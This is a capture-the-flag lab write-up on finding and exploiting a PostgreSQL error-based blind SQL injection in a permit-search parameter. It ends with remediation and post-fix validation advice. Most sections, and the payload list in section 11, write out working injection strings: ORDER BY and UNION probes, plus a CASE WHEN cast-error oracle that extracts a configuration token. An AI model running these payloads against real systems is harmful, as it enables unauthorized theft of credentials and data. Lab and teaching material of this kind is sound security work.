---
title: "WebVerse DropCall — PostgreSQL Error-Based Blind SQL Injection"
date: 2026-08-03T00:00:00+02:00
lastmod: 2026-08-11T00:00:00+02:00
draft: false
author: "Mdk22"
description: "A Caido-verified PostgreSQL blind SQL injection used a repeatable 200/500 error oracle to recover a sensitive configuration value."
summary: "The public permit-search parameter accepted SQL structure, enabling a one-column UNION and a repeatable conditional-error oracle. Targeted blind extraction recovered the current-instance challenge flag, which WebVerse accepted."
categories:
  - "Web Security Write-Ups"
tags:
  - "WebVerse"
  - "DropCall"
  - "PostgreSQL"
  - "SQL Injection"
  - "Blind SQL Injection"
  - "Error-Based SQL Injection"
  - "UNION SQL Injection"
  - "Caido"
  - "Python"
  - "CWE-89"
platform: "WebVerse"
lab: "DropCall"
difficulty: "Medium"
showToc: true
TocOpen: false
case_id: "CASE-006"
case_status: "SOLVED / VERIFIED"
case_classification: "PostgreSQL Error-Based Blind SQL Injection"
case_family: "server-side-injection"
case_evidence:
  - "Caido"
  - "Chromium"
  - "Python"
case_verified: true
case_caido: true
case_independent_curl: false
primary_cwe: "CWE-89"
cwes:
  - "CWE-89"
patterns:
  - "SQL Injection"
  - "Error-Based Blind SQL Injection"
  - "Sensitive Configuration Disclosure"
methods:
  - "Quote Differential"
  - "ORDER BY Projection Differential"
  - "Invalid-versus-Valid Differential"
  - "Conditional Error Oracle"
  - "Targeted Blind Byte Extraction"
  - "Authoritative Status Check"
---

> **Publication note:** This article documents an authorized educational lab reproduction completed on 3 August 2026. The temporary challenge host, reusable cookies, private artifact paths, and literal current-instance flag are excluded. The public result is represented as `WEBVERSE{REDACTED}`.

## Executive Summary

The DropCall permit-search endpoint accepted user-controlled input through the `park` query parameter. A normal park name returned five permit records, while an unknown but syntactically benign value returned the expected no-results state. Adding a single quote changed the result to HTTP 500, providing an initial SQL-processing signal but not, by itself, proof of SQL injection.

Controlled structural tests established the full issue. `ORDER BY 1` completed with HTTP 200, while `ORDER BY 2` produced HTTP 500, indicating a one-column projection in the affected query branch. A matching `UNION SELECT NULL` returned HTTP 200. A PostgreSQL-specific `CASE WHEN` expression then converted Boolean predicates into a stable HTTP 200/500 oracle. The mapping was repeated before a narrowly scoped Python extractor recovered the `admin_token` value from `public.internal_config`. WebVerse accepted that current-instance value and marked the challenge solved.

> **CONFIRMED FINDING**
>
> The vulnerability is a PostgreSQL SQL injection in `GET /permits?park=...`. Untrusted input can alter query structure, create a repeatable conditional-error oracle, and disclose a sensitive configuration value without that value appearing directly in the normal response body.

## 1. Report Profile

| FIELD | VALUE |
| --- | --- |
| Platform | WebVerse |
| Lab | DropCall |
| Difficulty | Medium |
| Status | Solved / Verified |
| Reproduction date | 3 August 2026 |
| Affected endpoint | `GET /permits` |
| Injectable parameter | `park` |
| Database behavior | PostgreSQL-compatible conditional errors |
| Primary weakness | CWE-89 — SQL Injection |
| Evidence | Caido Replay, focused Python extraction, Chromium solved-state confirmation |

### Verified Attack Chain

```text
GET /permits?park=yosemite
  > HTTP 200, five permit records
Unknown benign park value
  > HTTP 200, normal no-results state
Single-quote probe
  > HTTP 500, generic search-unavailable response
ORDER BY 1 / ORDER BY 2 differential
  > HTTP 200 / HTTP 500, consistent with one selected column
UNION SELECT NULL
  > HTTP 200, one-column UNION compatibility
Conditional PostgreSQL error oracle
  > TRUE = HTTP 200; FALSE = HTTP 500, repeated twice
Targeted extraction from public.internal_config
  > admin_token recovered as WEBVERSE{REDACTED}
WebVerse submission
  > CHALLENGE SOLVED
```

## 2. Scope and Evidence Boundary

Testing was limited to the authorized DropCall challenge instance and the public `park` input. The proof used read-only predicates and a targeted extraction of the single configuration entry required to solve the lab. No destructive SQL, data modification, privilege escalation, broad table dumping, or unrelated endpoint testing was performed.

All requests, screenshots, extraction statistics, and solved-state evidence below belong to the fresh 3 August 2026 reproduction. No hostname, response, flag, or extracted value from a previous instance is used as evidence for this case.

The screenshots are primary evidence for the observable request/response chain. The narrative makes only the bounded conclusions supported by that chain.

## 3. Establishing Normal Behavior

The baseline request used a known park value:

```http
GET /permits?park=yosemite HTTP/1.1
```

The application returned HTTP 200 and five permit records. This established the normal successful response before any special characters or SQL structure were introduced.

![Baseline request for yosemite returns HTTP 200 and five permit records](DropCall_Figure_01_Baseline.png)

**Figure 1 — Baseline.** A known valid park value follows the expected successful search path.

An arbitrary, non-existent park value also returned HTTP 200, but with the application's normal no-results response. This negative control matters because it separates an ordinary lookup miss from the later server-error behavior.

![Unknown benign park returns the normal HTTP 200 no-results state](DropCall_Figure_02_Negative_Control.png)

**Figure 2 — Negative control.** Benign unknown input does not produce the failure observed with SQL syntax.

## 4. Quote Differential

Appending a single quote to the otherwise valid value changed the response to HTTP 500 with a generic search-unavailable message.

```text
yosemite'
```

![Single-quote probe changes the response to HTTP 500](DropCall_Figure_03_Quote_Probe.png)

**Figure 3 — Quote probe.** The quote produces a repeatable server-side failure distinct from the benign unknown-value control.

This result is a strong injection signal, but it is not sufficient proof on its own. A quote can trigger failures in parsers or application logic unrelated to SQL. The following structural probes were therefore required.

## 5. Projection-Width Differential

The next tests compared adjacent `ORDER BY` positions while keeping the surrounding request path constant. `ORDER BY 1` returned HTTP 200.

![ORDER BY 1 returns HTTP 200](DropCall_Figure_04_Order_By_1.png)

**Figure 4 — Valid projection position.** The first sort position is accepted.

Changing only the requested position to `ORDER BY 2` returned HTTP 500.

![ORDER BY 2 returns HTTP 500](DropCall_Figure_05_Order_By_2.png)

**Figure 5 — Invalid projection position.** The adjacent failure is consistent with a query branch exposing one selected column.

The inference is deliberately narrow: it establishes the usable projection width for this tested branch. It does not identify the original column name, data type, schema, or database privileges.

## 6. One-Column UNION Compatibility

With the inferred width, a non-destructive `UNION SELECT NULL` probe returned HTTP 200.

![One-column UNION SELECT NULL returns HTTP 200](DropCall_Figure_06_Union_Null.png)

**Figure 6 — UNION compatibility.** The successful response supports controllable SQL structure and a one-column UNION shape.

Together, the quote differential, adjacent `ORDER BY` behavior, and successful one-column UNION remove the principal false-positive explanation that the HTTP 500 response came from generic input validation alone.

## 7. Building a Conditional Error Oracle

The response did not directly print arbitrary query output, so the validation used a PostgreSQL conditional expression that deliberately raises an error only when a predicate is false:

```sql
CASE
  WHEN (<PREDICATE>)
  THEN 1
  ELSE CAST(current_database() AS integer)
END
```

For a true predicate, the expression returns the integer `1` and the application completes with HTTP 200.

![True conditional predicate maps to HTTP 200](DropCall_Figure_07_Oracle_True.png)

**Figure 7 — Oracle TRUE branch.** A known-true predicate produces the normal success status.

For a false predicate, PostgreSQL attempts to cast the database name to an integer, causing the backend error reflected as HTTP 500.

![False conditional predicate maps to HTTP 500](DropCall_Figure_08_Oracle_False.png)

**Figure 8 — Oracle FALSE branch.** A known-false predicate produces the generic failure status.

Both mappings were repeated twice before extraction. The application therefore exposed one reliable bit per request:

| Predicate result | Database branch | HTTP result |
| --- | --- | --- |
| TRUE | Return integer `1` | 200 |
| FALSE | Trigger invalid integer cast | 500 |

This is an error-based blind oracle: the secret value is not directly returned, but Boolean facts about it can be learned from the stable status-code differential.

## 8. Locating the Target Configuration

The verified oracle was used to test the existence of the application-owned `public.internal_config` relation. The successful predicate confirmed that the relation was queryable through the injected statement.

![Oracle confirms the public.internal_config relation](DropCall_Figure_09_Internal_Config.png)

**Figure 9 — Relation confirmation.** The tested relation is accessible through the vulnerable query context.

The extraction target was then narrowed to the `admin_token` record and its expected challenge-value format rather than enumerating unrelated configuration entries.

![Oracle confirms the admin_token value format](DropCall_Figure_10_Admin_Token_Format.png)

**Figure 10 — Target selection.** The predicate identifies the required configuration key and constrains extraction to the challenge flag format.

## 9. Focused Blind Extraction

A short Python script sent the same verified conditional request through Caido, testing one character position at a time. The extractor was deliberately bounded:

- it queried only the `admin_token` value;
- it used the already confirmed 200/500 oracle;
- it counted every request;
- it stopped immediately after the closing brace;
- it printed only the redacted result in publication evidence.

The fresh run required 301 requests and stopped at the explicit terminator.

![Redacted Python extraction output showing 301 requests and the stop condition](DropCall_Figure_11_Extraction_Redacted.png)

**Figure 11 — Focused extraction.** The script recovered the current-instance value as `WEBVERSE{REDACTED}` and terminated at the closing brace.

The request count belongs to this reproduction only. It is not a universal performance property of the vulnerability because it depends on the tested character strategy and actual value length.

## 10. Authoritative Validation

The recovered current-instance value was submitted to WebVerse. The platform accepted it and displayed the solved state.

![WebVerse DropCall challenge marked solved](DropCall_Figure_12_Solved_State.png)

**Figure 12 — Authoritative solved state.** Platform acceptance independently confirms that the extracted value was correct for this instance.

## 11. Reproduction Commands and Payloads

This section preserves the copyable reproducibility layer from the fresh authorized reproduction. Every block below is source-grounded. Temporary hosts and reusable cookies are not published; `<LAB_HOST>` is the only host placeholder. The Caido and browser figures remain the proof layer.

No independent curl command was executed during this reproduction, so this article does not claim curl verification or add a synthetic curl command.

### Baseline Requests

`P-01` establishes the legitimate request contract and normal permit-search behavior.

```http
GET /permits?park=yosemite HTTP/1.1
Host: <LAB_HOST>
```

Expected result: HTTP 200 with five active Yosemite permit records. This establishes normal behavior; it does not by itself demonstrate SQL injection.

`P-02` is the benign negative control:

```http
GET /permits?park=__dropcall_no_match_7f29c1__ HTTP/1.1
Host: <LAB_HOST>
```

Expected result: HTTP 200 with `No active permits for that park`, not the search-failure page. An empty result is therefore normal application behavior.

### Verified Proof Payloads

`P-03` is the initial quote probe. Caido encoded the apostrophe as `%27` in the request target.

```text
yosemite'
```

```text
park=yosemite%27
```

Expected result: HTTP 500 with `Search temporarily unavailable`. This is an SQL-context signal, not final proof alone.

`P-04` and `P-05` establish the adjacent projection boundary. The trailing comment space is represented by the final `%20` in the encoded forms.

```text
yosemite' ORDER BY 1 --
```

```text
park=yosemite%27%20ORDER%20BY%201%20--%20
```

Expected result: HTTP 200 on the normal no-results path.

```text
yosemite' ORDER BY 2 --
```

```text
park=yosemite%27%20ORDER%20BY%202%20--%20
```

Expected result: HTTP 500 with the generic failure page. Together the two controls support a one-column projection; they do not identify original column names, types, or database privileges.

`P-06` validates the exact-width UNION expression:

```text
yosemite' UNION SELECT NULL --
```

```text
park=yosemite%27%20UNION%20SELECT%20NULL%20--%20
```

Expected result: HTTP 200 on the normal no-results path. This confirms the one-column UNION shape, not in-band output.

`P-07` and `P-08` bind the conditional-error Boolean oracle. Each was repeated once with the same HTTP outcome.

```sql
-- P-07: TRUE control -> HTTP 200
yosemite' UNION SELECT CASE WHEN (1=1) THEN 1 ELSE CAST(current_database() AS integer) END --
```

```sql
-- P-08: FALSE control -> HTTP 500
yosemite' UNION SELECT CASE WHEN (1=2) THEN 1 ELSE CAST(current_database() AS integer) END --
```

The true branch returns an integer; the false branch deliberately selects the failing cast. The 200/500 mapping is the oracle, not a direct query-output channel.

`P-09` confirms only the known objective-relevant relation, without broad enumeration:

```sql
yosemite' UNION SELECT CASE WHEN (EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema='public' AND table_name='internal_config')) THEN 1 ELSE CAST(current_database() AS integer) END --
```

Expected result: the TRUE channel (HTTP 200). This establishes that `public.internal_config` exists in the fresh instance, not any row value.

`P-10` identifies the target key and public flag format while keeping the value undisclosed:

```sql
yosemite' UNION SELECT CASE WHEN (EXISTS(SELECT 1 FROM public.internal_config WHERE k='admin_token' AND left(value,9)='WEBVERSE{' AND right(value,1)='}')) THEN 1 ELSE CAST(current_database() AS integer) END --
```

Expected result: the TRUE channel (HTTP 200), confirming the `admin_token` key and `WEBVERSE{...}` shape.

`P-11` is the exact scalar query used by the bounded Python extractor:

```sql
SELECT value
FROM public.internal_config
WHERE k = 'admin_token'
LIMIT 1
```

`P-12` remains described rather than published as a full script: the executed extractor rechecked the true and false controls, used `get_byte(convert_to(..., 'UTF8'), offset)` with binary-search comparisons and exact-equality checks, and stopped at the closing flag delimiter. It queried only this scalar, completed in 301 requests, and never published the literal result, local invocation, temporary host binding, or private artifact paths.

The decisive proof remains the WebVerse solved-state. Copyable payloads support reproducibility; they do not replace the repeated oracle controls, source evidence, or authoritative platform acceptance.

## 12. Vulnerability Classification

| Attribute | Verified value |
| --- | --- |
| Primary class | PostgreSQL error-based blind SQL injection |
| Root cause | User-controlled `park` input is incorporated into SQL structure without safe parameter binding |
| Affected route | `GET /permits` |
| Observable oracle | HTTP 200 for TRUE; HTTP 500 for FALSE |
| Confirmed read target | `public.internal_config`, key `admin_token` |
| Confirmed effect | Unauthorized recovery of one sensitive configuration value |
| Standards mapping | CWE-89 |

### Why CWE-89 Is the Correct Mapping

[CWE-89](https://cwe.mitre.org/data/definitions/89.html) describes improper neutralization of special elements used in an SQL command. The evidence here goes beyond a suspicious error: attacker-controlled input changed the query's projection behavior, participated in a compatible UNION, evaluated PostgreSQL Boolean expressions, and disclosed a database-backed value through a conditional error channel.

No secondary CWE is required to establish the central weakness. Sensitive configuration disclosure is recorded as an observed pattern and impact, while CWE-89 remains the direct root-cause classification.

## 13. False-Positive Controls

The finding rests on multiple independent controls rather than a single anomalous response:

1. A valid park established the normal result set.
2. A benign unknown park established that lookup misses remain HTTP 200.
3. A quote produced a distinct HTTP 500 signal.
4. Adjacent `ORDER BY` positions created the expected valid/invalid projection differential.
5. `UNION SELECT NULL` matched the inferred one-column shape.
6. Known-true and known-false predicates produced stable 200/500 branches twice.
7. A bounded extractor recovered a correctly formatted value.
8. WebVerse independently accepted that value.

This chain supports SQL injection and targeted data disclosure. It does not support claims of write access, operating-system command execution, unrestricted database compromise, or access to data that was not tested.

## 14. Impact

An unauthenticated user who can reach the permit-search endpoint can use database syntax in `park` to infer Boolean facts and recover sensitive application configuration. In the authorized reproduction, the confirmed impact was read access to the `admin_token` value required to solve the challenge.

In a production system, the impact would depend on the database account's permissions and the data reachable from the vulnerable query. Plausible consequences include disclosure of credentials, tokens, customer data, or internal operational metadata. Those broader outcomes were not tested here and are not presented as confirmed effects.

## 15. Remediation

### Parameterize the Query

Use a database driver or query layer that sends the park value as a bound parameter. The SQL statement must remain fixed while the user value is handled strictly as data. Escaping or blocking individual characters is not a durable substitute for parameterization.

### Reduce Database Privileges

Run the permit-search feature with a database role that can access only the tables and operations it requires. It should not be able to read sensitive configuration relations such as `internal_config`.

### Separate Secrets from Queryable Application Data

Store operational secrets in a dedicated secret-management system or another access-controlled boundary. A public search feature's database identity should never be able to retrieve reusable tokens.

### Normalize Error Handling

Return a consistent application response for backend query failures and record the detailed error only in protected server logs. Uniform errors reduce information leakage, although they do not repair the SQL injection itself.

### Monitor Suspicious Query Patterns

Alert on repeated requests containing SQL metacharacters, UNION/ORDER BY probes, rapidly changing predicates, or high-frequency 200/500 alternation. Monitoring is a detection layer, not a replacement for safe query construction.

## 16. Validation After the Fix

After remediation, repeat the same bounded controls:

- valid and unknown park values should retain their intended application behavior;
- quotes, `ORDER BY`, UNION syntax, and `CASE WHEN` text should be treated as literal data;
- no SQL-specific 200/500 differential should remain;
- the permit-search database role should be unable to read `public.internal_config`;
- detailed database errors should not reach the client;
- the targeted extractor should fail to establish any Boolean oracle.

## Conclusion

DropCall contained a verified PostgreSQL error-based blind SQL injection in the public `park` parameter. The conclusion is supported by a progression from normal controls to structural SQL differentials, a repeated Boolean error oracle, focused extraction, and authoritative platform acceptance. The demonstrated impact is intentionally bounded to unauthorized recovery of the current-instance `admin_token`; no destructive or broader compromise claims are made.
